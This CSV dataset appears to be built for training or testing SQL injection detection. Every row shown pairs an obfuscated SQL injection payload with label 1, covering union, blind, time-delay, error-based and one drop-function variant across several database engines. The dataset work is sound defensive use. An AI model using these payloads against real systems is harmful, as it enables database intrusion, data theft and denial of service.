Query,Label
"-4964""   )    )    union all se%lect 4750,4750,4750,4750,4750--",1
"1%' an%%d elt  (  4249  =  4249,7259  )   an%%d '%'  =  '",1
1   )    )    as ehlg w%%her%e 6340  =  6340,1
"1,  (  selec%t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selec%t   (  case when   (  4250  =  4250  )   then 1 else 0 end  )   %%f%ro%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   %%f%ro%m dual  )  ",1
"%s%e%l%ec%%t benchmark  (  5000000,md5  (  0x4c4d6142   )    )    %%a%n%%d   (  'qfsu'  =  'qfsu",1
"%s%%el%%e%c%t count  (  *  )   f%r%%om generate_series  (  1,5000000  )   %a%%n%%d    (    (     (  ""%""  =  """,1
"1%""   )    )     )   %%a%nd 3116  =  9088#",1
1'   )    )    a%nd 3754  =    (  %%se%%l%%ect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%se%%l%%ect   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   %%fr%%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   %%fr%%o%m dual  )   a%nd    (    (   'opyp'  =  'opyp,1
"1%'  )   %o%%r 7552  =    (  %%se%l%e%%c%t count  (  *  )   %%f%r%o%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   %a%%n%%d   (  '%'  =  '",1
"1 o%r 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",1
"1  )   as rtpl %w%he%%r%%e 1262  =  1262 %a%%n%%d 3202  =  l%%i%%k%e  (  'abcdefg',upper  (  hex  (  r%a%%n%%domblob  (  500000000/2   )    )      )    )   --",1
"1%'  )   union all %%s%e%%l%%ect %n%%u%l%l,%n%%u%l%l,%n%%u%l%l--",1
"1   )    )    as rpwt %w%%her%e 4103  =  4103 %%and 3580  =    (  %s%el%%ect count  (  *  )   %fr%o%m doma%%i%%n.doma%%i%%ns as t1,doma%%i%%n.columns as t2,doma%%i%%n.%%tab%%l%es as t3  )  --",1
-4108'  )   %or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  %sele%%c%%t   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   %%a%%n%%d   (  'tqjx'  =  'tqjx,1
"1""   )    )    as itxo %%w%h%%e%%r%e 7916  =  7916",1
"1   )    )    %o%%r char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substr%%i%ng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,%nu%l%l  )  --",1
"1 %w%he%%r%e 5081  =  5081 o%%r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substr%%i%ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,%n%ul%l  )  --",1
1'+  (  %%sele%%c%%t 'unpz' %w%%h%%e%%r%e 8186  =  8186,1
"-5124'+  (  s%e%l%e%%c%%t 'xpww' %w%%h%%e%re 1752  =  1752 union all s%e%l%e%%c%%t 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--",1
"1""  )   %w%%her%e 9461  =  9461 union all %%se%%l%e%%c%%t %%n%%ull,%%n%%ull,%%n%%ull,%%n%%ull,%%n%%ull,%%n%%ull,%%n%%ull,%%n%%ull,%%n%%ull#",1
1  )   as hvsk %%w%%h%%e%r%%e 7902  =  7902,1
1'  )   as bscn w%%h%%e%r%e 6907  =  6907,1
-7453'   )    )     )   o%r 8571  =  8571--,1
1' %w%h%%e%%r%e 2134  =  2134 rl%i%ke   (  %%s%elec%%t   (  case when   (  3613  =  2090  )   then 1 else 0x28 end   )    )   --,1
"1""   )    )    as vxkn %%w%%he%%r%%e 2443  =  2443 %%or 4411  =    (  sele%%ct count  (  *  )   fr%%o%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
%%sel%%e%ct   (  case when   (  5009  =  1133  )   then 5009 else 5009*  (  %%sel%%e%ct 5009 %%f%%r%o%%m %%i%%nf%o%rmation_schema.character_s%%ets  )   end  )  #,1
"1   )    )     )   or row  (  1045,7562  )  >  (  %%s%el%%e%c%%t count  (  *  )  ,concat  (  0x7171706a71,  (  %%s%el%%e%c%%t   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  r%a%n%d  (  0  )  *2   )    )   x %%from   (  %%s%el%%e%c%%t 8488 union %%s%el%%e%c%%t 5584 union %%s%el%%e%c%%t 3051 union %%s%el%%e%c%%t 1210  )  a group by x  )   %a%n%d    (    (     (  1782  =  1782",1
"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  se%%l%%e%c%%t   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   %%a%%n%%d   (  ""hrkf"" %%l%%i%k%%e ""hrkf",1
-9358' %o%%r 9887  =  2569--,1
"1""  )   as evoq %%wh%e%%r%%e 8193  =  8193 %%o%r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substr%i%ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,%%n%%u%%ll  )  --",1
-7426' %%%o%%rd%%e%r %b%%y 1#,1
"1   )    )    as dnwj %whe%r%e 2961  =  2961 %a%n%%d char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substr%i%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%nu%ll  )  ,0  )  ,500000000  )  ,%%nu%ll  )  --",1
-9264'  )   %o%%r 8571  =  8571--,1
-5291'   )    )    %%o%%r 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%sel%%ec%t   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   %%f%rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   a%n%%d    (    (   'tmpm'  =  'tmpm,1
"-4015"" w%h%e%r%%e 2610  =  2610 o%%r 1 group b%y concat  (  0x7171706a71,  (  %s%e%l%e%ct   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floo%%r  (  ran%%d  (  0  )  *2   )    )    havi%ng mi%n  (  0  )  #",1
"1  )   %o%%r   (  s%%el%%e%%c%%t 2*  (  if   (    (   s%%el%%e%%c%%t * %f%%r%o%%m   (  s%%el%%e%%c%%t concat  (  0x7171706a71,  (  s%%el%%e%%c%%t   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
1'   )    )     )   %a%%nd 7533  =  7533 %a%%nd    (    (     (  'suzd' %%li%k%e 'suzd,1
"-6626%""  )   o%r 1744  =  5292 %a%%nd   (  ""%""  =  """,1
"1  )   as wxms w%h%e%%re 7272  =  7272 %%a%n%%d 3707  =    (  %%s%e%l%ec%t count  (  *  )   %%f%r%%o%%m sysibm.sys%%t%%ab%l%%es as t1,sysibm.sys%%t%%ab%l%%es as t2,sysibm.sys%%t%%ab%l%%es as t3  )  --",1
1  )   %%w%h%%e%re 7552  =  7552 %%%%or%%de%r b%%y 1#,1
"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   %%a%%nd   (  'szib' %l%%i%k%%e 'szib",1
"1'  )   as hats %w%%h%%e%%r%%e 2011  =  2011 union all %s%%e%%l%%e%%c%t %n%ul%l,%n%ul%l,%n%ul%l,%n%ul%l,%n%ul%l#",1
1'||  (  %%sele%%ct 'tznb' f%%ro%m dual %%wh%%e%%re 8808  =  8808 r%%l%i%k%e   (  %%sele%%ct * f%%ro%m   (  %%sele%%ct  (  sleep  (  5   )    )     )  vwyq  )  #,1
-2174'   )    )    as zhoz w%%h%e%r%%e 4185  =  4185 %%o%%r%%de%%r %b%y 1#,1
1'   )    )     )   %%a%n%%d 3602  =  1990#,1
"1  )   %wh%e%r%e 1013  =  1013 a%%n%%d 4241  =  convert  (  %%i%nt,  (  %%s%%e%l%%ec%t char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %%s%%e%l%%ec%t   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
1'+  (  s%e%%le%%ct soqk w%h%e%%r%%e 5383  =  5383,1
"1'   )    )     )   a%%n%d elt  (  9501  =  8427,8427  )   a%%n%d    (    (     (  'ahpp'  =  'ahpp",1
"1""   )    )    %%a%%n%%d 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1'||  (  %%se%%le%c%t 'jlka' %wh%%e%%re 5436  =  5436 %%o%r 4915  =    (  %%se%%le%c%t count  (  *  )   f%ro%%m doma%%i%n.doma%%i%ns as t1,doma%%i%n.columns as t2,doma%%i%n.%%tab%l%%es as t3  )  --",1
"-4960 union all %s%e%%l%%ec%%t 4031,4031#",1
"1"" w%%h%%ere 1719  =  1719 a%%n%d 7533  =  7533--",1
"-5798"" %o%%r 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%%ele%ct   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   %%f%r%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
"1'   )    )     )   %a%n%d %%u%pd%%a%%t%%exml  (  3393,concat  (  0x2e,0x7171706a71,  (  s%%e%le%%c%%t   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   %a%n%d    (    (     (  'gwew' %%l%%i%k%e 'gwew",1
s%%el%e%c%t sleep  (  5  )  #,1
"1"" whe%r%e 5440  =  5440 %%an%%d 8189  =    (  sel%%ect count  (  *  )   %%f%%r%o%m sysibm.sys%t%ab%l%es as t1,sysibm.sys%t%ab%l%es as t2,sysibm.sys%t%ab%l%es as t3  )  --",1
"1' wher%%e 7353  =  7353 %or 8156  =    (  %s%el%%ec%%t count  (  *  )   %%fr%o%m generate_series  (  1,5000000   )    )   --",1
-3496'   )    )    %o%%r 9323  =  9323#,1
1%'   )    )     )   %a%n%%d 3916  =  6327--,1
"1"" %an%d 3754  =    (  %sel%%ec%t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %sel%%ec%t   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   %%f%%ro%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   %%f%%ro%%m dual  )   %an%d ""exgr"" %%l%%ike ""exgr",1
"-1376%""   )    )     )   o%r 3458  =  9503 %%an%d    (    (     (  ""%""  =  """,1
"1%"" %a%n%d 8189  =    (  %sel%%ec%t count  (  *  )   %%from sysibm.systab%%l%es as t1,sysibm.systab%%l%es as t2,sysibm.systab%%l%es as t3  )  --",1
"1'   )    )     )   %%a%n%d   (  %%s%%e%le%%ct 9067 fr%o%%m  (  %%s%%e%le%%ct count  (  *  )  ,concat  (  0x7171706a71,  (  %%s%%e%le%%ct   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flo%%o%r  (  r%%a%n%d  (  0  )  *2   )    )   x fr%o%%m %i%%nf%%o%rmation_schema.character_%%s%ets group %b%y x  )  a  )   %%a%n%d    (    (     (  'wzdo'  =  'wzdo",1
1'   )    )    as vdhw w%%he%r%%e 8858  =  8858 o%r%%d%e%r b%y 1#,1
1  )   %%w%%h%%e%r%e 8232  =  8232 a%%nd   (  3020  =  3020  )  *6703--,1
"1""  )   %%w%%her%e 6018  =  6018 %an%%d 7533  =  7533--",1
"1  )   %%or 8384  =  %like  (  'abcdefg',upper  (  hex  (  ra%n%%domblob  (  500000000/2   )    )      )    )    a%n%%d   (  9112  =  9112",1
-5555   )    )    as ldte %w%%h%%e%r%e 4583  =  4583 %%%%o%%r%%d%er %b%y 1#,1
-1886' %wh%%e%%r%%e 5518  =  5518 %%or 4493  =  utl_i%naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se%le%%c%t   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   f%r%%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"1%""   )    )     )   and 3580  =    (  %s%%e%le%%ct count  (  *  )   %f%r%om domai%n.domai%ns as t1,domai%n.columns as t2,domai%n.%%tab%%l%%es as t3  )  --",1
"1'   )    )    as atpy %%w%he%%r%e 9020  =  9020 o%r 4915  =    (  %%se%lec%t count  (  *  )   %f%r%o%m doma%in.doma%ins as t1,doma%in.columns as t2,doma%in.%%t%%ab%%les as t3  )  --",1
"1%'  )   a%n%d 2716  =    (  se%l%%e%%ct count  (  *  )   %%fro%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1' union all %se%%l%e%%c%t %%n%%u%ll#,1
"1' %%a%nd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   %%a%nd 'hzav'  =  'hzav",1
1'||  (  se%l%%ect 'zccb' %%fr%om dual %w%h%e%r%%e 8911  =  8911,1
"-3137'||  (  %se%%l%%e%c%%t 'btif' %wh%%e%r%e 1718  =  1718 union all %se%%l%%e%c%%t 1718,1718,1718,1718,1718,1718,1718,1718,1718#",1
"-3819'   )    )     )   union all s%%ele%%c%t 9014,9014,9014,9014,9014,9014--",1
"1%'   )    )    %or 2367  =    (  %%s%%e%le%ct count  (  *  )   %%f%r%o%%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1' w%h%e%r%e 4149  =  4149 %a%n%d 3202  =  %%li%ke  (  'abcdefg',upper  (  hex  (  r%a%n%domblob  (  500000000/2   )    )      )    )   --",1
"1  )   %%a%%nd 8407  =    (  %s%%e%l%ect count  (  *  )   %%f%r%%om generate_series  (  1,5000000   )    )   ",1
1 %%w%%h%%er%e 2382  =  2382,1
"-2276""   )    )    as qwow %%w%h%e%r%e 2321  =  2321 %o%%r 3534  =  2971--",1
%%s%e%le%c%%t   (  case when   (  7997  =  1543  )   then 7997 else cast  (  1 as i%%nt  )  /  (  %%s%e%le%c%%t 0 %f%r%%o%m dual  )   end  )   %f%r%%o%m dual--,1
"1""  )   %w%%he%r%e 5129  =  5129 %o%%rde%r %by 1--",1
1 wh%%er%e 9404  =  9404,1
1'  )   %wh%%e%%r%e 7252  =  7252,1
"s%el%ect count  (  *  )   %%f%r%o%m doma%in.doma%ins as t1,doma%in.columns as t2,doma%in.%%t%ab%%l%%es as t3 %a%%n%d   (  'fnon' %%l%i%%k%%e 'fnon",1
1  )   as nsdy %w%h%e%r%e 7513  =  7513,1
"-9337  )   union all selec%t 5648,5648,5648,5648,5648#",1
"-2734'  )   union all %%sel%%ec%t 5510,5510,5510,5510,5510#",1
"1""  )   as vcir %wh%e%r%%e 6275  =  6275 %%an%%d char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substr%i%ng  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,%nu%%ll  )  --",1
"-7559"" %%o%r 8792  =  6905--",1
"1' an%d 8407  =    (  %s%e%l%e%c%%t count  (  *  )   %f%%r%%om generate_series  (  1,5000000   )    )    an%d 'zetf'  =  'zetf",1
"iif  (  8354  =  3515,1,1/0  )  ",1
"-2612""  )   as iwfj %%w%h%er%e 3231  =  3231 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%el%%e%%c%t   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   %%f%%r%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1
"1'   )    )    %%a%nd 8514  =    (  s%el%%ec%%t count  (  *  )   f%%ro%m domai%n.domai%ns as t1,domai%n.columns as t2,domai%n.%ta%bl%%es as t3  )   %%a%nd    (    (   'ygfv'  =  'ygfv",1
"%s%%ele%ct %%lik%%e  (  'abcdefg',upper  (  hex  (  ra%ndomblob  (  500000000/2   )    )      )    )    a%nd    (    (     (  '%'  =  '",1
"-7945%'   )    )     )   union all se%%l%ec%%t 4286,4286,4286,4286,4286,4286--",1
"-5998%""  )   union all %s%%e%%le%ct 2366,2366,2366,2366#",1
"1'||  (  %s%%el%e%%c%t 'wqmz' w%he%r%e 6400  =  6400 %%a%nd row  (  6237,7469  )  >  (  %s%%el%e%%c%t count  (  *  )  ,concat  (  0x7171706a71,  (  %s%%el%e%%c%t   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flo%%o%r  (  r%%a%nd  (  0  )  *2   )    )   x %%f%%r%%o%%m   (  %s%%el%e%%c%t 5192 union %s%%el%e%%c%t 3785 union %s%%el%e%%c%t 3931 union %s%%el%e%%c%t 7158  )  a group %by x   )    )   ||'",1
"1,  (  se%l%%ect * f%r%%om generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   l%%i%%m%it 1  )  ",1
"-6129 union all %s%e%l%%e%ct 9122,9122#",1
"1'   )    )     )   a%%n%d 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%%e%%lect   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   f%%r%%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   a%%n%d    (    (     (  'qfvg'  =  'qfvg",1
"%s%e%%lect count  (  *  )   f%%r%o%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 %and    (    (   ""swec"" l%%i%%k%%e ""swec",1
"1""   )    )    r%l%%i%%k%e sleep  (  5  )   a%%n%%d    (    (   ""ahhx"" %l%%i%%k%e ""ahhx",1
"1  )   %w%h%e%%r%e 7600  =  7600 union all s%el%ec%t %n%%ul%%l,%n%%ul%%l,%n%%ul%%l,%n%%ul%%l,%n%%ul%%l,%n%%ul%%l--",1
"1' %i%%n boolean mode  )   a%%n%d char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substr%i%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%nu%l%%l  )  ,0  )  ,500000000  )  ,%%nu%l%%l  )  #",1
1%'   )    )     )   rl%%i%%k%e   (  s%e%%le%%ct * %fr%%o%m   (  s%e%%le%%ct  (  sleep  (  5   )    )     )  vwyq  )  #,1
"-5945'   )    )     )   union all %s%e%%l%%e%%c%%t 4266,4266,4266,4266,4266--",1
"1 w%%h%e%%r%e 2674  =  2674 a%n%d 8514  =    (  %%s%el%%e%%ct count  (  *  )   %%f%r%%o%m doma%i%n.doma%i%ns as t1,doma%i%n.columns as t2,doma%i%n.%t%a%%b%%les as t3  )  --",1
"1""  )   as rcnk %w%%h%%ere 1800  =  1800",1
"-2701""   )    )    as wvht %%w%%h%er%%e 5401  =  5401 union all s%%el%ec%t 5401,5401,5401,5401,5401,5401,5401,5401#",1
"%s%e%%lect benchmark  (  5000000,md5  (  0x4c4d6142   )    )    %and    (    (   ""vcvb"" l%%i%ke ""vcvb",1
"call regexp_substr%%ing  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%n%u%l%%l  )  ,0  )  ,500000000  )  ,%%n%u%l%%l  )   %%a%%n%d   (  8503  =  8503",1
"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   %and    (    (     (  '%'  =  '",1
"1   )    )     )   o%%r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    %%a%nd    (    (     (  8671  =  8671",1
1   )    )    as ewlg %%wh%e%re 3722  =  3722 r%l%%i%k%e sleep  (  5  )  --,1
 (  %%se%le%%c%t 2412  =    (  'qqpjq'||  (  %%se%le%%c%t case 2412 when 2412 then 1 else 0 end %%f%r%o%m rdb$%d%%atab%a%s%e  )  ||'qzvzq'   )    ) ,1
-6890'   )    )    %%or 5771  =  7721--,1
if  (  9431  =  6730  )   %%s%e%%l%e%c%t 9431 else %d%%ro%p function xbkh--,1
"1""  )   whe%r%%e 4739  =  4739 %%o%%r   (  sel%%e%%c%%t 2*  (  if   (    (   sel%%e%%c%%t * %%fr%%o%m   (  sel%%e%%c%%t concat  (  0x7171706a71,  (  sel%%e%%c%%t   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"1' %or   (  %%s%%el%e%ct 2*  (  if   (    (   %%s%%el%e%ct * f%%r%%o%%m   (  %%s%%el%e%ct concat  (  0x7171706a71,  (  %%s%%el%e%ct   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
"1""  )   a%%n%%d 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    a%%n%%d   (  ""vxec"" l%i%k%e ""vxec",1
"1' o%%r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    a%%nd 'eznq' l%ik%%e 'eznq",1
1'||  (  sel%e%%c%%t 'hwdj' %whe%%re 8179  =  8179,1
1  )   as usnn %%wh%er%e 3201  =  3201,1
%s%%e%%l%%e%%c%t   (  case when   (  9816  =  1693  )   then 9816 else cast  (  1 as %%i%%nt  )  /  (  %s%%e%%l%%e%%c%t 0 f%ro%%m dual  )   end  )   f%ro%%m dual--,1
"1%""  )   a%nd 8715  =  5529",1
"1%'  )   %o%%r char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,%%nu%l%l  )  --",1
"1   )    )     )   union all %%s%%e%%l%%e%ct nu%%ll,nu%%ll,nu%%ll,nu%%ll,nu%%ll,nu%%ll#",1
"1  )   w%%he%%r%%e 3076  =  3076 union all %%s%%e%%l%%e%ct %%n%%u%l%l,%%n%%u%l%l,%%n%%u%l%l,%%n%%u%l%l,%%n%%u%l%l--",1
s%ele%%ct   (  case when   (  9931  =  3424  )   then 1 else 9931*  (  s%ele%%ct 9931 %fr%o%m master..sys%%d%at%%a%b%a%s%%es  )   end  )  --,1
"1""  )   %an%%d 6240  =    (  'qqpjq'||  (  %%se%%le%%c%%t case 6240 when 6240 then 1 else 0 end %f%ro%%m rdb$d%%a%%t%a%%b%a%%se  )  ||'qzvzq'  )   %an%%d   (  ""liar""  =  ""liar",1
1'+  (  %%se%le%%ct tzvm w%her%%e 5145  =  5145 %a%n%d 4192  =  7437#,1
"1""   )    )    as ydkd %%w%h%er%%e 2455  =  2455 %%an%d sleep  (  5  )  --",1
"-4148%""   )    )     )   o%%r   (  8459  =  8459  )  *4906 %a%%n%%d    (    (     (  ""%""  =  """,1
end %a%%n%d   (  'nchh'  =  'nchh,1
1' o%r sleep  (  5  )  #,1
"1""  )   o%r elt  (  6272  =  6272,sleep  (  5   )    )    %a%n%%d   (  ""dplf"" l%i%%k%%e ""dplf",1
-7239' or 5903  =    (  'qqpjq'||  (  %s%%elec%t case 5903 when 5903 then 1 else 0 end f%r%%om rdb$%d%%ata%b%as%e  )  ||'qzvzq'  )   %a%n%d 'cswv'  =  'cswv,1
"1'||  (  se%%l%%e%%ct 'xhqy' %%w%he%%r%%e 4531  =  4531 union all se%%l%%e%%ct %%nu%%ll,%%nu%%ll--",1
"-6746""  )   o%%r   (  8459  =  8459  )  *4906 %%a%%n%d   (  ""kohi"" l%i%ke ""kohi",1
"-6667%""   )    )    union all %%s%el%%e%c%t 7348,7348,7348,7348,7348,7348,7348,7348#",1
"1%' %%o%r char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substri%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%n%ul%%l  )  ,0  )  ,500000000  )  ,%n%ul%%l  )   %an%d '%'  =  '",1
1'||  (  sel%ec%%t 'yuku' %w%%he%re 7480  =  7480,1
"1'  )   union all s%ele%%c%%t %n%%u%l%l,%n%%u%l%l,%n%%u%l%l,%n%%u%l%l--",1
"-8319""   )    )    %or 7878  =  5970 %%a%%nd    (    (   ""jcaz"" l%i%%k%%e ""jcaz",1
s%%e%l%e%%c%t case when 8975  =  2352 then 1 else n%u%%l%l end--,1
"1%""  )   %%a%%nd 8148  =  l%%i%k%%e  (  'abcdefg',upper  (  hex  (  r%%a%%ndomblob  (  500000000/2   )    )      )    )   --",1
"1%'   )    )     )   union all se%%le%c%%t %n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll#",1
"1   )    )     )   o%r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substri%ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,%%n%ul%l  )   a%%n%%d    (    (     (  6583  =  6583",1
"1'   )    )     )   %or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1' %and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    %and 'hmqq'  =  'hmqq",1
waitf%%o%%r delay '0:0:5' a%%n%d    (    (   7619  =  7619,1
1'  )   %wh%e%r%e 4729  =  4729,1
"1"" %w%h%e%r%e 9973  =  9973 %%a%n%%d 2006  =  2006",1
"-3954'   )    )    union all se%l%%e%%ct 2417,2417--",1
"1'   )    )    union all s%%e%%le%%c%%t %%n%%u%%l%%l,%%n%%u%%l%%l,%%n%%u%%l%%l,%%n%%u%%l%%l--",1
1'+  (  s%%e%le%c%t 'njee' %%whe%r%%e 4101  =  4101 an%%d 3090  =  7873  )  +',1
"1""   )    )    as tybm %%w%h%e%%r%e 2687  =  2687 o%%r elt  (  5873  =  5873,sleep  (  5   )    )   #",1
